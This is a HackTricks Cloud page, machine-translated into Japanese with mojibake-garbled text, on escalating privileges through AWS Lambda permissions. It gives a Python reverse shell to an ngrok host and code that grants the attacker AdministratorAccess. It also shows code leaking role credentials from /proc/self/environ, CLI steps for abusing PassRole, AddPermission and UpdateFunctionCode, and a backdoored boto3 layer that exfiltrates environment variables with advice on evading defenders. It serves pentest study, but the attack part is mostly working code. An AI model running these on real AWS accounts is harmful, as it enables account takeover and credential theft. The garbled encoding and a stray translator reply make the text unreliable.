# AWS - Lambda Privesc

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## lambda

lambdaã«ã¤ã„ã¦ã®è©³ç´°ã¯ã“ã¡ã‚‰:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`,** ãŠã‚ˆã³ **`lambda:InvokeFunction`** ã®æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€é¸æŠã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã«å¯¾å¿œã™ã‚‹AWSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚€æ–°ã—ã„Lambdaé–¢æ•°ã«æ—¢å­˜ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æ¸¡ã™ã“ã¨ã§**æ¨©é™æ˜‡æ ¼ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™**ã€‚ãã®å¾Œã€AWS APIã‚’é€šã˜ã¦é–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦**ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
Since the provided text does not contain any English content to be translated, there is no translation to provide. The markdown syntax given is already complete and does not require any additional content or translation. If you have any specific English text that you need translated into Japanese, please provide the text, and I will translate it for you while maintaining the original markdown and HTML syntax.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Lambdaé–¢æ•°è‡ªä½“ã‹ã‚‰**lambdaãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’æ‚ªç”¨ã™ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
Lambdaãƒ­ãƒ¼ãƒ«ã«ååˆ†ãªæ¨©é™ãŒã‚ã‚Œã°ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦è‡ªåˆ†ã«ç®¡ç†è€…æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Lambdaã®ãƒ­ãƒ¼ãƒ«è³‡æ ¼æƒ…å ±ã‚’å¤–éƒ¨æ¥ç¶šãªã—ã§æ¼æ´©ã•ã›ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯å†…éƒ¨ã‚¿ã‚¹ã‚¯ã«ä½¿ç”¨ã•ã‚Œã‚‹**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ†é›¢ã•ã‚ŒãŸLambda**ã«ã¨ã£ã¦æœ‰ç”¨ã§ã™ã€‚ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹æœªçŸ¥ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ãŒã‚ã‚‹å ´åˆã€ã“ã®ã‚³ãƒ¼ãƒ‰ç‰‡ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Lambdaã®å‡ºåŠ›ã¨ã—ã¦ç›´æ¥è³‡æ ¼æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python 
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š** ç‰¹å®šã•ã‚ŒãŸä»»æ„ã®Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

{% hint style="danger" %}
**`lambda:InvokeAsync`** ãŒèˆˆå‘³æ·±ã„ã‚ˆã†ã«è¦‹ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€**å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯** `lambda:InvokeFunction` ã‚‚å¿…è¦ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

å‰ã®ã‚·ãƒŠãƒªã‚ªã¨åŒæ§˜ã«ã€**`lambda:AddPermission`** æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**è‡ªåˆ†è‡ªèº«ã« `lambda:InvokeFunction`** æ¨©é™ã‚’**ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š** ä»»æ„ã®Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã«ç›´æ¥æ˜‡æ ¼ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`**ï¼ˆãŠãã‚‰ã`dynamodb:PutItem`ã¨`dynamodb:CreateTable`ã‚‚ï¼‰ã®æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€`lambda:InvokeFunction`æ¨©é™ã¯**æŒã£ã¦ã„ãªã„**ãŒã€æ—¢å­˜ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æ–°ã—ã„Lambdaé–¢æ•°ã«**æ¸¡ã™ã“ã¨ã§**æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®é–¢æ•°ã«ã¯ã€é¸æŠã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã«å¯¾å¿œã™ã‚‹AWSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’æ–°è¦ä½œæˆã™ã‚‹ã‹ã€æ—¢å­˜ã®ã‚‚ã®ã‚’ä½¿ç”¨ã—ã¦**ã€ãã®DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’æŒ‡ã™**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’Lambdaé–¢æ•°ã«ä½œæˆã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã«ã€ãƒ†ãƒ¼ãƒ–ãƒ«ã«ã‚¢ã‚¤ãƒ†ãƒ ã‚’è¿½åŠ ã™ã‚‹ã‹ã€ã¾ãŸã¯åˆ¥ã®æ–¹æ³•ã§ã‚¢ã‚¤ãƒ†ãƒ ãŒè¿½åŠ ã•ã‚Œã‚‹ã®ã‚’å¾…ã£ã¦ã€**Lambdaé–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹**ã‚ˆã†ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
**ã‚³ãƒ¼ãƒ‰**ãŒPythonãƒ•ã‚¡ã‚¤ãƒ«å†…ã§**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨ã™ã‚‹ãƒ­ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹**å ´åˆã€ä¾‹ã¨ã—ã¦ã¯å‰ã®æ–¹æ³•ã§ä½¿ç”¨ã•ã‚ŒãŸåŒã˜ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒã‚ã‚Šã¾ã™ã€‚

ãã®å¾Œã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ç¾åœ¨ã®AWSç’°å¢ƒã§**DynamoDBãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹**ã«ä¾å­˜ã—ã¾ã™ã€‚**ã‚‚ã—**ä½¿ç”¨ã•ã‚Œã¦**ã„ã‚‹**å ´åˆã€Lambdaé–¢æ•°ã®ãŸã‚ã«**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’ä½œæˆã™ã‚‹**ã ã‘ã§æ¸ˆã¿ã¾ã™ãŒã€ãã†ã§ãªã„å ´åˆã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦**ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ãŒæœ‰åŠ¹ãªãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
ã“ã®ã‚³ãƒãƒ³ãƒ‰ã®å¾Œã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’ä½œæˆã™ã‚‹ã“ã¨ã«ã‚ˆã‚Š**ã€Lambdaé–¢æ•°ã¨DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’**æ¥ç¶šã—ã¾ã™**ï¼š
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda é–¢æ•°ã¨ã‚¹ãƒˆãƒªãƒ¼ãƒ ãŒæ¥ç¶šã•ã‚ŒãŸã®ã§ã€æ”»æ’ƒè€…ã¯ **DynamoDB ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ã§ Lambda é–¢æ•°ã‚’å‘¼ã³å‡ºã™** ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ DynamoDB ãƒ†ãƒ¼ãƒ–ãƒ«ã«ã‚¢ã‚¤ãƒ†ãƒ ã‚’å…¥ã‚Œã‚‹ã“ã¨ã§ã€ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
ã“ã®æ™‚ç‚¹ã§ã€Lambdaé–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€æ”»æ’ƒè€…ã¯AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ç®¡ç†è€…ã«ãªã‚Šã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š** æŒ‡å®šã•ã‚ŒãŸlambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `lambda:AddPermission`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**è‡ªåˆ†è‡ªèº«ï¼ˆã¾ãŸã¯ä»–è€…ï¼‰ã«ä»»æ„ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆã“ã‚Œã«ã‚ˆã‚Šã€ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ãƒªã‚½ãƒ¼ã‚¹ãƒ™ãƒ¼ã‚¹ã®ãƒãƒªã‚·ãƒ¼ãŒç”Ÿæˆã•ã‚Œã¾ã™ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**æ½œåœ¨çš„å½±éŸ¿ï¼š** Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã«ç›´æ¥æ˜‡æ ¼ã—ã€ã‚³ãƒ¼ãƒ‰ã®å¤‰æ›´ã¨å®Ÿè¡Œã®è¨±å¯ã‚’ä¸ãˆã‚‹ã€‚

### `lambda:AddLayerVersionPermission`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**è‡ªåˆ†è‡ªèº«ï¼ˆã¾ãŸã¯ä»–è€…ï¼‰ã«`lambda:GetLayerVersion`ã®æ¨©é™ã‚’ä»˜ä¸**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€è„†å¼±æ€§ã‚„æ©Ÿå¯†æƒ…å ±ã‚’æ¢ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**æ½œåœ¨çš„å½±éŸ¿ï¼š** æ©Ÿå¯†æƒ…å ±ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®å¯èƒ½æ€§ã€‚

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€IAM ãƒ­ãƒ¼ãƒ«ãŒã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸæ—¢å­˜ã®Lambdaé–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã‚’æ›´æ–°ã—ã¦ã€é–¢é€£ã™ã‚‹AWSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãã®ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã§ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã€ãã®ãƒ­ãƒ¼ãƒ«ã‚’ä»£è¡¨ã—ã¦ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ç›´æ¥å‘¼ã³å‡ºã™ã“ã¨ãŒã§ããªã„å ´åˆã¯ã€å‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’å¾…ã¤å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€æ—¢ã«å­˜åœ¨ã—ã¦ã„ã‚‹å ´åˆã¯ã€ä½•ã‚‰ã‹ã®æ–¹æ³•ã§å‘¼ã³å‡ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
é–¢é€£ã™ã‚‹ **.zip ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€Lambda ã®ãƒ­ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™**ã€‚ä¾‹ã¨ã—ã¦ã¯ã€å‰ã®æ–¹æ³•ã‹ã‚‰ã®ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š** Lambda ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥ã®æ¨©é™æ˜‡æ ¼ã€‚

### `lambda:UpdateFunctionConfiguration`

#### ç´¹ä»‹

[**Lambda ãƒ¬ã‚¤ãƒ¤ãƒ¼**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) ã¯ã€ã‚³ãƒ¼ãƒ‰ã‚’ Lambda é–¢æ•°ã«å«ã‚ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ãŒã€**åˆ¥ã€…ã«ä¿å­˜ã™ã‚‹ã“ã¨ã§**ã€é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã‚’å°ã•ãä¿ã¡ã€**è¤‡æ•°ã®é–¢æ•°ãŒã‚³ãƒ¼ãƒ‰ã‚’å…±æœ‰ã§ãã¾ã™**ã€‚

Lambda å†…ã§ã€Python ã‚³ãƒ¼ãƒ‰ãŒãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒ‘ã‚¹ã‚’æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã§ç¢ºèªã§ãã¾ã™ï¼š
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
ã“ã‚Œã‚‰ãŒå ´æ‰€ã§ã™ï¼š

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ä¾‹ãˆã°ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒª boto3 ã¯ `/var/runtime/boto3`ï¼ˆ4ç•ªç›®ã®ä½ç½®ï¼‰ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚

#### æ‚ªç”¨

**é–¢æ•°ã«ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã™ã‚‹**ã«ã¯ã€`lambda:UpdateFunctionConfiguration` æ¨©é™ã®ã¿ãŒå¿…è¦ã§ã‚ã‚Šã€**ãƒ¬ã‚¤ãƒ¤ãƒ¼ã¯ã‚¢ã‚«ã‚¦ãƒ³ãƒˆé–“ã§å…±æœ‰å¯èƒ½**ã§ã™ã€‚ã¾ãŸã€æ­£ã—ãã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã™ã‚‹ãŸã‚ã«ã¯ã€**ã©ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹**ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã®ä¾‹ã§ã¯ã€æ”»æ’ƒã•ã‚ŒãŸé–¢æ•°ãŒ boto3 ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã¨**ä»®å®šã—ã¾ã™**ã€‚

å¿µã®ãŸã‚ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆé–¢æ•°ã§å•é¡ŒãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ç•°ãªã‚‹ç‚¹ãŒãªã„ã‚ˆã†ã«ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã—ã¦ã„ã‚‹ Lambda ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ï¼ˆPython 3.7ï¼‰ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ boto3 ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®åŒã˜ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ Pip ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚ç¾åœ¨ã®ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã¯ boto3 ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 1.9.42 ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚

ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€boto3 ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 1.9.42 ã¨ãã®ä¾å­˜é–¢ä¿‚ã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã® "lambda\_layer" ãƒ•ã‚©ãƒ«ãƒ€ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ï¼š
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
æ¬¡ã«ã€`/lambda_layer/boto3/__init__.py` ã‚’é–‹ãã€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ã¾ã™ã€‚è¿½åŠ ã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š

![](<../../../.gitbook/assets/image (26).png>)

`requests` ã¯ `botocore` ã‹ã‚‰ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ç’°å¢ƒå¤‰æ•°ã‚’æŠœãå–ã‚Šã¾ã™ã€‚try-except ã¨ 0.1 ç§’ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã¯ã€ã“ã®ã‚³ãƒ¼ãƒ‰ãŒä½•ã‚‚å£Šã•ãªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã‚ã‚Šã¾ã™ã€‚

{% hint style="info" %}
**é‡è¦ãªæ³¨æ„:** å®Ÿéš›ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã§ã¯ `from botocore.vendored import requests` ã‚’ä½¿ç”¨ã—ãªã„ã§ãã ã•ã„ã€‚ãªãœãªã‚‰ã€ãã®é–¢æ•°ã® CloudWatch ãƒ­ã‚°ã« â€œDeprecationWarningâ€ ãŒè¡¨ç¤ºã•ã‚Œã€é˜²å¾¡è€…ã«ã‚ˆã£ã¦ç™ºè¦‹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒé«˜ããªã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’ **ZIP ãƒ•ã‚¡ã‚¤ãƒ«** ã«ã¾ã¨ã‚ã¦ã€**æ”»æ’ƒè€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ–°ã—ã„ Lambda ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰** ã—ã¾ã™ã€‚ã¾ãš â€œpythonâ€ ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‚’ä½œæˆã—ã€ãã“ã«ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’å…¥ã‚Œã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã™ã‚Œã°ã€Lambda ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸæ™‚ã«ã‚³ãƒ¼ãƒ‰ãŒ â€œ/opt/python/boto3â€ ã§è¦‹ã¤ã‹ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒ Python 3.7 ã¨äº’æ›æ€§ãŒã‚ã‚Šã€**ãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒã‚¿ãƒ¼ã‚²ãƒƒãƒˆé–¢æ•°ã¨åŒã˜ãƒªãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ã‚‹**ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ãã‚ŒãŒå®Œäº†ã—ãŸã‚‰ã€`lambda:AddLayerVersionPermission` ã‚’ä½¿ç”¨ã—ã¦ 